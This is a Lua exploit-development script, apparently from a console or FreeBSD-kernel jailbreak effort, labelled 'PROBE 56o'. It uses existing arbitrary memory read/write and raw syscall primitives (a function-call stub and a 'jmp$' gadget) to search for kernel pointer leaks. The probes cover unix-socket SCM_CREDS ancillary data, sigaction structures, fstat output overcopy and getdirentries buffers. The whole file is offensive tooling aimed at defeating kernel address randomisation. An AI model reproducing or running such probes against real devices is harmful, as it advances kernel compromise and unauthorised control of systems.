-- CRASH_CLASS: LOW
-- PROBE 56o: unix socket SCM_CREDS leak + signal delivery frame scan
--
-- A: Create unix socketpair, enable LOCAL_CREDS, send/recv message,
--    scan the cmsg ancillary data for kernel pointers in padding.
-- B: Set up SIGUSR1 handler via sigaction, trigger signal from child
--    thread, scan the signal frame on the user stack for kernel pointers.
-- C: fstat deep scan — check ALL fields of struct stat for kernel addresses.
-- D: getdirentries on /app0 — scan full buffer for uninitialized data.

print("=== PROBE 56o: CREDS + SIGNAL + FSTAT + DIRENT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local SENTINEL = 0xCCCCCCCC

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function scan_kptr(base, len, label)
    local found = false
    for off = 0, len - 8, 4 do
        local lo = rd(base + off)
        local hi = rd(base + off + 4)
        if lo and hi then
            local uh = hi; if uh < 0 then uh = uh + 0x100000000 end
            local ul = lo; if ul < 0 then ul = ul + 0x100000000 end
            -- Real kernel ptr: 0xFFFF8000-0xFFFFFFFE range, NOT 0xFFFFFFFF
            if uh >= 0xFFFF8000 and uh < 0xFFFFFFFF then
                found = true
                print(string.format("  *** %s KPTR +0x%X: 0x%08X%08X ***",
                    label, off, uh, ul))
            end
        end
    end
    return found
end

-- ============ SECTION A: Unix socketpair + SCM_CREDS ============
print("--- A: unix socketpair + SCM_CREDS ---")

local sc_socketpair = mk(135)  -- socketpair
local sc_setsockopt = mk(105)
local sc_sendmsg = mk(28)
local sc_recvmsg = mk(27)
local sc_close = mk(6)
local sc_mmap = mk(477)

-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv)
local sv = memory.alloc(8)
wd(N(sv), 0); wd(N(sv) + 4, 0)
local ok1, r1 = pcall(function()
    return sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(N(sv)))
end)
local sp_ret = ok1 and N(r1) or -999
local fd0 = rd(N(sv))
local fd1 = rd(N(sv) + 4)
print("  socketpair=" .. sp_ret .. " fds=" .. tostring(fd0) .. "," .. tostring(fd1))

if sp_ret == 0 and fd0 and fd1 and fd0 >= 0 and fd1 >= 0 then
    -- Enable LOCAL_CREDS on receiving socket (fd1)
    -- LOCAL_CREDS = 2 at SOL_LOCAL = 0
    local one = memory.alloc(4)
    wd(N(one), 1)
    local ok2, r2 = pcall(function()
        return sc_setsockopt(uint64(fd1), uint64(0), uint64(2),
            uint64(N(one)), uint64(4))
    end)
    print("  LOCAL_CREDS=" .. (ok2 and tostring(N(r2)) or "FAIL"))

    -- Send a byte on fd0
    local snd_data = memory.alloc(8)
    wd(N(snd_data), 0x41414141)

    local snd_iov = memory.alloc(16)
    wq(snd_iov, uint64(N(snd_data)))            -- iov_base
    wq(uint64(N(snd_iov) + 8), uint64(4))       -- iov_len

    -- struct msghdr (amd64): name(8) namelen(4) pad(4) iov(8) iovlen(4) pad(4) control(8) controllen(4) flags(4) = 0x30
    local snd_msg = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(snd_msg) + i, 0) end
    wq(uint64(N(snd_msg) + 0x10), uint64(N(snd_iov)))  -- msg_iov @ +0x10
    wd(N(snd_msg) + 0x18, 1)                             -- msg_iovlen @ +0x18

    local ok3, r3 = pcall(function()
        return sc_sendmsg(uint64(fd0), uint64(N(snd_msg)), uint64(0))
    end)
    print("  sendmsg=" .. (ok3 and tostring(N(r3)) or "FAIL"))

    -- Receive on fd1 with cmsg buffer
    local rcv_data = memory.alloc(16)
    wd(N(rcv_data), SENTINEL)

    local rcv_iov = memory.alloc(16)
    wq(rcv_iov, uint64(N(rcv_data)))
    wq(uint64(N(rcv_iov) + 8), uint64(16))

    local cmsg_buf = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local cba = N(cmsg_buf)
    for off = 0, 0x1000 - 4, 4 do wd(cba + off, SENTINEL) end

    local rcv_msg = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(rcv_msg) + i, 0) end
    wq(uint64(N(rcv_msg) + 0x10), uint64(N(rcv_iov)))   -- msg_iov @ +0x10
    wd(N(rcv_msg) + 0x18, 1)                              -- msg_iovlen @ +0x18
    wq(uint64(N(rcv_msg) + 0x20), uint64(cba))           -- msg_control @ +0x20
    wd(N(rcv_msg) + 0x28, 0x1000)                         -- msg_controllen @ +0x28

    local ok4, r4 = pcall(function()
        return sc_recvmsg(uint64(fd1), uint64(N(rcv_msg)), uint64(0))
    end)
    local recv_ret = ok4 and N(r4) or -999
    print("  recvmsg=" .. recv_ret)

    -- Read actual controllen returned @ +0x28
    local clen = rd(N(rcv_msg) + 0x28) or 0
    print("  controllen=" .. clen)

    if clen > 0 then
        -- Dump cmsg header + data
        print("  cmsg first 64B:")
        for off = 0, math.min(clen, 64) - 4, 4 do
            local v = rd(cba + off) or SENTINEL
            if v ~= SENTINEL then
                local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                print(string.format("    +0x%02X: 0x%08X", off, uv))
            end
        end
        scan_kptr(cba, math.min(clen + 64, 0x1000), "CMSG")
    else
        print("  no ancillary data returned")
    end

    pcall(function() sc_close(uint64(fd0)) end)
    pcall(function() sc_close(uint64(fd1)) end)
else
    print("  socketpair failed — skipping SCM_CREDS")
end

if not alive() then print("DEAD after A"); return end

-- ============ SECTION B: sigaction + signal frame scan ============
print("")
print("--- B: signal delivery frame ---")

-- Set up SIGUSR1 handler. But we need a function pointer for the handler.
-- Use the jmp$ gadget — when the signal fires, the handler runs at jmp$
-- and we can't easily return. Better: use SIG_IGN and check if siginfo
-- is available through sigtimedwait or similar.
--
-- Actually, the cleanest approach: use sigaction to READ the current
-- signal disposition. sigaction(416) with oldact pointer returns the
-- old handler struct, which might contain kernel addresses.

local sc416 = mk(416)  -- sigaction
local oldact = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(oldact) + i, SENTINEL) end

-- Read SIGUSR1 (30) disposition
local ok5, r5 = pcall(function()
    return sc416(uint64(30), uint64(0), uint64(N(oldact)))
end)
print("  sigaction(SIGUSR1,NULL,old)=" .. (ok5 and tostring(N(r5)) or "FAIL"))

if ok5 and N(r5) == 0 then
    print("  old sigaction struct:")
    for off = 0, 0x38, 4 do
        local v = rd(N(oldact) + off) or SENTINEL
        if v ~= SENTINEL then
            local uv = v; if uv < 0 then uv = uv + 0x100000000 end
            print(string.format("    +0x%02X: 0x%08X", off, uv))
        end
    end
    scan_kptr(N(oldact), 0x40, "SIGACT")
end

-- Also read dispositions for a few more signals
local sigs = {1, 2, 10, 12, 14, 17, 20, 31}
for _, sig in ipairs(sigs) do
    for i = 0, 0x3C, 4 do wd(N(oldact) + i, SENTINEL) end
    local ok6, r6 = pcall(function()
        return sc416(uint64(sig), uint64(0), uint64(N(oldact)))
    end)
    if ok6 and N(r6) == 0 then
        local found = scan_kptr(N(oldact), 0x40, "SIG" .. sig)
        if not found then
            -- Just report handler address
            local hlo = rd(N(oldact))
            local hhi = rd(N(oldact) + 4)
            if hlo and hhi and (hlo ~= 0 or hhi ~= 0) then
                local uh = hhi; if uh < 0 then uh = uh + 0x100000000 end
                local ul = hlo; if ul < 0 then ul = ul + 0x100000000 end
                print(string.format("  sig%d handler=0x%08X%08X", sig, uh, ul))
            end
        end
    end
end

if not alive() then print("DEAD after B"); return end

-- ============ SECTION C: fstat deep scan ============
print("")
print("--- C: fstat deep scan ---")

local sc189 = mk(189)  -- fstat

-- Open /app0/eboot.bin
local sc5 = mk(5)
local ename = memory.alloc(32)
-- "/app0/eboot.bin\0"
wd(N(ename), 0x7070612F)     -- /app
wd(N(ename) + 4, 0x62652F30) -- 0/eb
wd(N(ename) + 8, 0x2E746F6F) -- oot.
wd(N(ename) + 12, 0x006E6962) -- bin\0

local ok7, efd = pcall(function()
    return sc5(ename, uint64(0), uint64(0))
end)
local ef = ok7 and N(efd) or -1
print("  eboot_fd=" .. ef)

if ef >= 0 then
    -- struct stat is ~120 bytes on FreeBSD. Allocate more for overcopy check.
    local stbuf = memory.alloc(0x200)
    local sta = N(stbuf)
    for off = 0, 0x1FC, 4 do wd(sta + off, SENTINEL) end

    local ok8, r8 = pcall(function()
        return sc189(uint64(ef), uint64(sta))
    end)
    print("  fstat=" .. (ok8 and tostring(N(r8)) or "FAIL"))

    -- Scan for kernel pointers in first 256 bytes
    local fstat_kptr = scan_kptr(sta, 0x100, "FSTAT")

    -- Dump first 128 bytes
    print("  stat struct first 128B:")
    for off = 0, 0x7C, 4 do
        local v = rd(sta + off) or SENTINEL
        if v ~= SENTINEL then
            local uv = v; if uv < 0 then uv = uv + 0x100000000 end
            print(string.format("    +0x%02X: 0x%08X", off, uv))
        end
    end

    -- Check overcopy past 120 bytes (typical stat size)
    local over = false
    for off = 120, 0x100, 4 do
        local v = rd(sta + off) or SENTINEL
        if v ~= SENTINEL then
            if not over then
                over = true
                print("  OVERCOPY past 120B:")
            end
            local uv = v; if uv < 0 then uv = uv + 0x100000000 end
            print(string.format("    +0x%02X: 0x%08X", off, uv))
        end
    end
    if not over then print("  no overcopy past stat") end

    pcall(function() sc_close(uint64(ef)) end)
end

if not alive() then print("DEAD after C"); return end

-- ============ SECTION D: getdirentries ============
print("")
print("--- D: getdirentries scan ---")

local sc_getdents = mk(272)  -- getdirentries (FreeBSD)
-- Try to open /app0 as a directory
local dname = memory.alloc(16)
wd(N(dname), 0x7070612F)     -- /app
wd(N(dname) + 4, 0x00000030) -- 0\0

-- O_RDONLY | O_DIRECTORY = 0x20000
local ok9, dfd_v = pcall(function()
    return sc5(dname, uint64(0x20000), uint64(0))
end)
local dfd = ok9 and N(dfd_v) or -1
print("  /app0 fd=" .. dfd)

if dfd >= 0 then
    local dbuf = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local dba = N(dbuf)
    for off = 0, 0x1000 - 4, 4 do wd(dba + off, SENTINEL) end

    local basep = memory.alloc(8)
    wq(basep, uint64(0))

    local ok10, r10 = pcall(function()
        return sc_getdents(uint64(dfd), uint64(dba), uint64(0x1000), uint64(N(basep)))
    end)
    local dret = ok10 and N(r10) or -999
    print("  getdirentries=" .. dret)

    if dret > 0 then
        scan_kptr(dba, math.min(dret + 64, 0x1000), "DIRENT")

        -- Dump first 64 bytes
        print("  first 64B of dirents:")
        for off = 0, 60, 4 do
            local v = rd(dba + off) or SENTINEL
            if v ~= SENTINEL then
                local uv = v; if uv < 0 then uv = uv + 0x100000000 end
                print(string.format("    +0x%02X: 0x%08X", off, uv))
            end
        end
    end

    pcall(function() sc_close(uint64(dfd)) end)
else
    -- Try without O_DIRECTORY
    local ok11, dfd2_v = pcall(function()
        return sc5(dname, uint64(0), uint64(0))
    end)
    local dfd2 = ok11 and N(dfd2_v) or -1
    print("  /app0 fd (no O_DIR)=" .. dfd2)
    if dfd2 >= 0 then pcall(function() sc_close(uint64(dfd2)) end) end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56o COMPLETE ===")
